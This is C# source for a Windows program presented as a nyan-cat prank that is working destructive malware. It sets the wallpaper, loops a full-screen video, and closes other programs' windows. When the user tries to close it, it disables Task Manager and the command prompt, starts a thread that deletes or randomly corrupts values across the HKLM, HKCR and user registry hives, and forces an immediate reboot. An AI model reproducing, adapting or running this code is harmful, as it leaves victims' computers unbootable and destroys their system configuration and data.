using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Net;
using System.Windows.Input;
using Microsoft.Win32;
namespace CyanIsLove
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
        const uint SPI_SETDESKWALLPAPER = 0x14;
        const uint SPIF_UPDATEINIFILE = 0x01;
        const uint SPIF_SENDWININICHANGE = 0x02;
        public Form1()
        {
            InitializeComponent();
        }
        System.Media.SoundPlayer sound;
        string appPath;
        DialogResult result2;
        [DllImport("user32.dll", SetLastError = true)] static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll", SetLastError = true)] static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
        enum GetWindow_Cmd : uint
        {
            GW_HWNDFIRST = 0,
            GW_HWNDLAST = 1,
            GW_HWNDNEXT = 2,
            GW_HWNDPREV = 3,
            GW_OWNER = 4,
            GW_CHILD = 5,
            GW_ENABLEDPOPUP = 6
        }
        [DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        private const int WM_COMMAND = 0x111;
        //

        static void HideIcons()
        {
            RegistryKey myKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);
            if (myKey != null)
            {
                myKey.SetValue("HideIcons", 1);
                myKey.Close();
            }
        }
        static void DisableCMD()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            objRegistryKey.SetValue("DisableCMD", "1");
            objRegistryKey.Close();
        }
        static void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            IntPtr hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
            HideIcons();
        }
        void wc_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            //result2 = MessageBox.Show(null, "GETTING READY : " + e.ProgressPercentage + "% ", "Hello", MessageBoxButtons.OK, MessageBoxIcon.Information);
            if (e.ProgressPercentage == 100)
            {
                Application.Exit();
                Application.ExitThread();
                Process.Start(Application.ExecutablePath);
            }
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            uint flags = SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE;

            Properties.Resources.nima.Save("heh.png");
            appPath = Path.GetDirectoryName(Application.ExecutablePath);
            if (!File.Exists(appPath + "\\heh.wmv"))
            {
                MessageBox.Show(null, "Hi, I'm getting ready :D\nPlease wait", "hi", MessageBoxButtons.OK, MessageBoxIcon.Information);
                using (var client = new WebClient())
                {
                    client.DownloadFileAsync(new Uri("https://raw.githubusercontent.com/NimaBastani/what-is-this/main/videoplayback.wmv"), appPath + "\\heh.wmv");
                    client.DownloadProgressChanged += wc_DownloadProgressChanged;
                }
                return;
            }
            SystemParametersInfo(SPI_SETDESKWALLPAPER,
            0, appPath+"\\heh.png", flags);
            this.TopMost = true;
            DialogResult result = MessageBox.Show(null, "Do you want to run nyan cat? :D", "What", MessageBoxButtons.YesNo, MessageBoxIcon.Information);
            if (result == DialogResult.No)
            {
                MessageBox.Show(null, "YOU SAID NO??? YOUR PC IS TRASHED NOW :)\nIf you shutdown your pc nyan cat will get hungry and will eat all of your files", "??????????????", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else
            {
                MessageBox.Show(null, "Now you will see nyan cat for ever :)\nIf you shutdown your pc nyan cat will get hungry and will eat all of your files", "OK", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            Process me = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses())
            {
                if (p.Id != me.Id && IntPtr.Zero != p.MainWindowHandle)
                {
                    // Sends WM_CLOSE; less gentle methods available too.
                    p.CloseMainWindow();
                }
            }

            axWindowsMediaPlayer1.URL = appPath + "\\heh.wmv";
            timer1.Enabled = true;
            axWindowsMediaPlayer1.PlayStateChange += new AxWMPLib._WMPOCXEvents_PlayStateChangeEventHandler(player_PlayStateChange);
            //System.Net.WebClient client = new System.Net.WebClient();
            //byte[] audio = client.DownloadData(new Uri("http://www.nyan.cat/music/original.mp3"));

            sound = new System.Media.SoundPlayer(Properties.Resources.sound);
            sound.PlayLooping();
            /*this.FormClosed += (s, e) => {
                MessageBox.Show(null, "You tried to kill me :(\nI will eat your files ha ha ha :D", "??????????????", MessageBoxButtons.OK, MessageBoxIcon.Error);
                e.Cancel = true;
            }*/
            //this.OnPreviewKeyDown += NimA_KeyPress;
        }
        double damage = 999;

        private int progress;
        private int max;

        private Random rng = new Random(99999);

        public void fuckReg(RegistryKey key, double dm)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    fuckReg(key.OpenSubKey(k, true), dm);
                }
                catch (Exception) { }
            }

            foreach (var v in key.GetValueNames())
            {
                try
                {
                    if (rng.NextDouble() <= damage * 99999 * dm)
                    {
                        key.DeleteValue(v);
                    }
                    else
                    {
                        corruptReg(key, v, dm);
                    }
                }
                catch (Exception) { }

                progress++;
            }
        }

        public int countReg(RegistryKey key)
        {
            int i = key.ValueCount;

            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    i += countReg(key.OpenSubKey(k, true));
                }
                catch (Exception) { }
            }

            return i;
        }

        public void corruptReg(RegistryKey key, string value, double dm)
        {
            var v = key.GetValue(value, null, RegistryValueOptions.DoNotExpandEnvironmentNames);

            switch (key.GetValueKind(value))
            {
                case RegistryValueKind.Binary:
                    byte[] arr = (byte[])v;
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (rng.NextDouble() <= damage * dm)
                        {
                            arr[i] = (byte)rng.Next(0, 256);
                        }
                    }
                    break;

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    if (rng.NextDouble() <= damage * dm)
                        v = rng.Next();

                    break;

                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    v = corruptString((string)v, dm);
                    break;

                case RegistryValueKind.MultiString:
                    string[] strs = (string[])v;

                    for (int i = 0; i < strs.Length; i++)
                    {
                        strs[i] = corruptString(strs[i], dm);
                    }

                    break;
            }

            key.SetValue(value, v, key.GetValueKind(value));
        }

        public string corruptString(string str, double dm)
        {
            string n = "";

            foreach (char c in str)
            {
                if (rng.NextDouble() <= damage * dm)
                    n += (char)rng.Next(32, 127);
                else
                    n += c;
            }

            return n;
        }

        public void fuck()
        {
            max += countReg(Registry.LocalMachine);
            max += countReg(Registry.ClassesRoot);
            max += countReg(Registry.Users);

            fuckReg(Registry.LocalMachine, 99999);
            fuckReg(Registry.ClassesRoot, 99999);
            fuckReg(Registry.Users, 99999);
            
        }
        private void NimA_KeyPress(object sender, KeyPressEventArgs e)
        {
        }
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            ToggleTaskManager("0");
            ToggleDesktopIcons();
            new System.Threading.Thread(fuck).Start();
            Process.Start("shutdown", "-f -r -t 0");
            MessageBox.Show(null, "You tried to kill me :(\nI will eat your files ha ha ha :D", "??????????????", MessageBoxButtons.OK, MessageBoxIcon.Error);
            e.Cancel = true;
        }
        private void Form1_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            ToggleTaskManager("0");
            ToggleDesktopIcons();
            new System.Threading.Thread(fuck).Start();
            Process.Start("shutdown", "-f -r -t 0");
            MessageBox.Show(null, "You tried to kill me :(\nI will eat your files ha ha ha :D", "??????????????", MessageBoxButtons.OK, MessageBoxIcon.Error);
            e.Cancel = true;
        }

        private void player_PlayStateChange(object sender, AxWMPLib._WMPOCXEvents_PlayStateChangeEvent e)
        {
            if(e.newState == 1 || e.newState == 2)
                axWindowsMediaPlayer1.Ctlcontrols.play();
        }
        // Display the file on the desktop.
        public void SetDWallpaper(string path)
        {
            //SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
        }
        public static void ToggleTaskManager(string keyValue)
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            objRegistryKey.SetValue("DisableTaskMgr", keyValue);
            objRegistryKey.Close();
            DisableCMD();
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            axWindowsMediaPlayer1.settings.autoStart = true;
            axWindowsMediaPlayer1.settings.volume = 100;
            axWindowsMediaPlayer1.stretchToFit = true;
            //sound.Play();
            this.Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            this.Location = new Point(0, 0);
            Process me = Process.GetCurrentProcess();
            foreach (Process p in Process.GetProcesses())
            {
                if (p.Id != me.Id && IntPtr.Zero != p.MainWindowHandle)
                {
                    // Sends WM_CLOSE; less gentle methods available too.
                    p.CloseMainWindow();
                }
            }
        }

        private void Form1_KeyPress(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Alt)
            {
                MessageBox.Show("NYAN CAT IS GETTING ANGRY");
                SendKeys.Send("{ENTER}");
            }
            if (e.KeyCode == Keys.Control)
            {
                MessageBox.Show("NYAN CAT IS GETTING ANGRY");
                SendKeys.Send("{ENTER}");
            }
        }
    }
}
